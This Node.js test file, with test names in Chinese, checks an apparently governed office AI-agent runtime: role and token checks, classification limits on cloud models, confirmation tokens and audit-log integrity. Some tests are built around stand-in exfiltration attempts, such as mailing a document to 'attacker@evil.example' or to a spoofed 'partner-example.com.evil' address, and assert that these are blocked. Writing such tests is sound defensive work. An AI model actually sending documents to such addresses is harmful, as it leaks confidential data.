'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { AgentRuntime } = require('../src/runtime.cjs');
const { GuardedPlanner, validatePlan } = require('../src/planner.cjs');
const { MockLLM, HttpLLM } = require('../src/llm.cjs');
const { PolicyEngine, AuditLog, RiskMeter } = require('../src/governance.cjs');
const { CapabilityToken } = require('../src/guard.cjs');
const { ConfirmationService } = require('../src/confirmation.cjs');
const { DOCS } = require('../src/scenario.cjs');

function fixture(llm = new MockLLM()) {
  const audit = new AuditLog(), risk = new RiskMeter(1000), policy = new PolicyEngine();
  const planner = new GuardedPlanner({ llm, audit, risk });
  return { audit, policy, planner, rt: new AgentRuntime({ policy, audit, risk, planner }) };
}
const token = (ids = []) => new CapabilityToken({ documentIds: ids,
  tools: ['readDoc', 'recognizeImage', 'summarize', 'sendInternalEmail', 'sendExternalEmail'], allowedExternalDomains: ['partner-example.com'] });

test('内部邮件也必须命中企业域名白名单', async () => {
  const { rt } = fixture();
  const ctx = { role: '员工', token: new CapabilityToken({ tools: ['readDoc', 'sendInternalEmail'], documentIds: ['M2'] }), command: '发送到 attacker@evil.example', nearfieldOnline: true };
  await rt.execStep({ action: 'readDoc', args: { id: 'M2' } }, 1, ctx);
  assert.match(await rt.execStep({ action: 'sendInternalEmail', args: { to: 'attacker@evil.example', docId: 'M2' } }, 2, ctx), /内部域名/);
  assert.equal(rt.outbox.length, 0);
});

test('删除和打印必须拥有目标文档授权', async () => {
  const { rt } = fixture();
  const result = await rt.execStep({ action: 'deleteDoc', args: { id: 'M2' } }, 1,
    { role: '员工', token: new CapabilityToken({ tools: ['deleteDoc'], documentIds: [] }), nearfieldOnline: true });
  assert.match(result, /资源未授权/);
});

test('撤销或过期令牌不能进入模型规划上下文', async () => {
  let seen = false;
  const { rt } = fixture({ plan: async () => { seen = true; return []; } });
  const revoked = new CapabilityToken({ documentIds: ['M1'], tools: ['readDoc'] });
  revoked.revoked = true;
  const result = await rt.runCommand('整理', { token: revoked });
  assert.match(result.join('\n'), /规划拒绝/);
  assert.equal(seen, false);
});

test('未知密级默认禁止出站', () => {
  const { checkDataBoundary } = require('../src/guard.cjs');
  assert.equal(checkDataBoundary({ title: '未分类', level: '未知', body: '内容' }, 'sendInternalEmail').allow, false);
});

test('角色拒绝在读取和图片识别前执行', async () => {
  const { rt } = fixture();
  // 访客=无任何业务权限（实习生自 v0.9 起为只读角色，见 agents.test.cjs）
  for (const [action, id] of [['readDoc', 'M1'], ['recognizeImage', 'I2']]) {
    const result = await rt.execStep({ action, args: { id } }, 1, { role: '访客', token: token([id]) });
    assert.match(result, /策略拒绝/);
  }
  assert.deepEqual(rt.knowledge, {});
});
test('模型上下文只包含任务明确授权资源；直接读取也不可绕过', async () => {
  let seen;
  const { rt } = fixture({ deployment: 'local', plan: async (_, blocks) => { seen = blocks; return []; } });
  await rt.runCommand('整理', { token: token(['M2']) });
  assert.deepEqual(seen.map(b => b.id), ['M2']);
  assert.match(await rt.execStep({ action: 'readDoc', args: { id: 'M1' } }, 1,
    { role: '员工', token: token(['M2']) }), /资源未授权/);
});
test('未知适配器不能通过 local 参数获取机密正文', async () => {
  let seen;
  const { planner } = fixture({ plan: async (_, blocks) => { seen = blocks; return []; } });
  await planner.makePlan('整理', { docs: [DOCS.M1], modelLocation: 'local' });
  assert.equal(seen[0].withheld, true);
  assert.ok(!JSON.stringify(seen).includes('预算上调'));
  assert.equal(new HttpLLM().deployment, 'cloud');
});
test('云模型拒绝机密指令和已知原文；PII 在请求前脱敏', async () => {
  let seen;
  const { planner } = fixture({ deployment: 'cloud', plan: async command => { seen = command; return []; } });
  await assert.rejects(planner.makePlan('任意内容', { commandLevel: '机密' }), /模型边界拒绝/);
  await assert.rejects(planner.makePlan(DOCS.M1.body, { docs: [DOCS.M1] }), /机密片段/);
  await planner.makePlan('联系 13800138000');
  assert.ok(!seen.includes('13800138000'));
});
test('模型凭空生成、地址后缀碰瓷和内部邮件目标均默认拒绝', () => {
  for (const action of ['sendExternalEmail', 'sendInternalEmail']) {
    const step = { action, args: { to: 'x@partner-example.com', docId: 'M2' } };
    assert.equal(validatePlan([step], { command: '整理材料' }).steps.length, 0);
    assert.equal(validatePlan([step], { command: '发给 x@partner-example.com.evil' }).steps.length, 0);
    assert.equal(validatePlan([step], { command: '发给 x@partner-example.com' }).steps.length, 1);
  }
});
test('直接执行出站工具也必须检查用户明确目标', async () => {
  const { rt } = fixture();
  const ctx = { role: '员工', token: token(['M2']), nearfieldOnline: true };
  await rt.execStep({ action: 'readDoc', args: { id: 'M2' } }, 1, ctx);
  assert.match(await rt.execStep({ action: 'sendExternalEmail', args: { to: 'x@partner-example.com', docId: 'M2' } }, 2, ctx), /未获用户明确授权/);
  assert.equal(rt.outbox.length, 0);
});
test('正常闭环发送的是生成稿，继承源文档密级与来源', async () => {
  const llm = new MockLLM();
  llm.generate = async () => '正式稿：周四十点开会，周五提交值班表。';
  const { rt } = fixture(llm);
  await rt.runCommand('整理周例会纪要发给 team@corp.internal', { token: token(['M2']) });
  assert.equal(rt.outbox.length, 1);
  assert.equal(rt.outbox[0].docId, 'draft_M2');
  assert.equal(rt.outbox[0].content, '正式稿：周四十点开会，周五提交值班表。');
  assert.equal(rt.knowledge.draft_M2.level, '内部');
  assert.deepEqual(rt.knowledge.draft_M2.sourceIds, ['M2']);
});
test('云侧生成机密稿被拒绝；生成的不合规内容不入库', async () => {
  const llm = new MockLLM(); let calls = 0;
  llm.generate = async () => { calls++; return '保证能够通过合规审查'; };
  const { rt } = fixture(llm);
  const ctx = { role: '员工', token: token(['M1', 'M2']), modelLocation: 'cloud' };
  await rt.execStep({ action: 'readDoc', args: { id: 'M1' } }, 1, ctx);
  assert.match(await rt.execStep({ action: 'summarize', args: { of: 'M1' } }, 2, ctx), /仅可由本地/);
  assert.equal(calls, 0);
  await rt.execStep({ action: 'readDoc', args: { id: 'M2' } }, 3, ctx);
  await rt.execStep({ action: 'summarize', args: { of: 'M2' } }, 4, ctx);
  assert.equal(rt.knowledge.draft_M2, undefined);
});
test('确认凭据绑定最终操作，一次性且到期拒绝', () => {
  let now = 1000;
  const service = new ConfirmationService({ now: () => now, ttlMs: 30 });
  const op = { to: 'a@example.com', content: '稿件 A' };
  let challenge = service.challenge(op), reply = service.simulateResponse(challenge);
  assert.equal(service.consume(reply, { ...op, content: '稿件 B' }), false);
  challenge = service.challenge(op); reply = service.simulateResponse(challenge);
  assert.equal(service.consume(reply, op), true);
  assert.equal(service.consume(reply, op), false);
  challenge = service.challenge(op); reply = service.simulateResponse(challenge); now += 30;
  assert.equal(service.consume(reply, op), false);
});
test('审计发现尾删；可信检查点可检测整链替换并跨文件恢复', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'office-audit-'));
  try {
    const file = path.join(dir, 'audit.json'), audit = new AuditLog();
    audit.append('a', { x: 1 }); audit.append('b', { x: 2 });
    const checkpoint = audit.save(file);
    assert.equal(AuditLog.load(file, checkpoint).verify(), true);
    audit.entries.pop(); assert.equal(audit.verify(), false);
    const other = new AuditLog(); other.append('forged', {}); other.save(file);
    assert.throws(() => AuditLog.load(file, checkpoint), /校验失败/);
  } finally { fs.rmSync(dir, { recursive: true }); }
});
test('策略实例互不污染；非法策略值被拒绝；缺少令牌安全拒绝', async () => {
  const first = new PolicyEngine(), second = new PolicyEngine();
  first.update('员工', 'readDoc', 'deny');
  assert.equal(second.decide('员工', 'readDoc'), 'allow');
  assert.throws(() => first.update('员工', 'readDoc', 'typo'), /非法/);
  const { rt } = fixture();
  assert.match(await rt.execStep({ action: 'readDoc', args: { id: 'M1' } }, 1, { role: '员工' }), /令牌缺失/);
});
